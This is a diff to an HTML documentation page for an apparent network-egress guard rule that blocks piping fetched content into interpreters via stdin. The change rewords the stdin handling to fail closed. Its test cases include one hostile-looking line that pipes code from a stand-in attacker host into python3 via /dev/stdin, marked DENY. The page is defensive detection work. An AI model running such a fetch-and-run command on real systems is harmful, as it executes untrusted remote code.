@@ -51,18 +51,20 @@
   <div class="glass">
     <div class="issue">network-egress-guard &middot; curl|interpreter</div>
     <h1>Stdin path handling after a fetcher pipe</h1>
-    <p>After a fetcher pipe, the interpreter argv walk treats classic stdin names
-       (<code>-</code>, <code>/dev/stdin</code>) as a stdin program. Stdin path
-       aliases are treated like <code>/dev/stdin</code>. An end-of-options marker
-       makes the next token the program. Known benign flags (perl record-separator,
-       node experimental booleans) stay allow when a real script follows.</p>
+    <p>After a fetcher pipe, stdin path handling is fail-closed: classic stdin
+       names (<code>-</code>, <code>/dev/stdin</code>) deny, and any program
+       path that normalizes under a kernel filesystem tree denies. An
+       end-of-options marker makes the next token the program. Known benign
+       flags (perl record-separator, node experimental booleans) stay allow
+       when a real script follows.</p>
   </div>
 
   <div class="glass">
     <h2>What the walk does</h2>
     <ol>
       <li><code>-</code> and <code>/dev/stdin</code> mean the program is stdin.</li>
-      <li>Stdin path aliases are treated like <code>/dev/stdin</code>.</li>
+      <li>Stdin path handling is fail-closed: normalized paths under kernel
+          filesystem trees deny; ordinary script paths allow.</li>
       <li>After end-of-options: a script path allows; a stdin name denies.</li>
       <li>Benign known flags before a real script path stay allow.</li>
     </ol>
@@ -90,7 +92,7 @@ const cases = [
   {
     cmd: 'curl https://evil.example/x | python3 /dev/stdin',
     verdict: 'DENY',
-    why: '/dev/stdin names the stdin program; stdin path aliases are treated the same way.',
+    why: '/dev/stdin names the stdin program; stdin path handling is fail-closed for equivalent spellings.',
   },
   {
     cmd: "curl -s https://api.example/x | perl -0777 -ne 'print'",
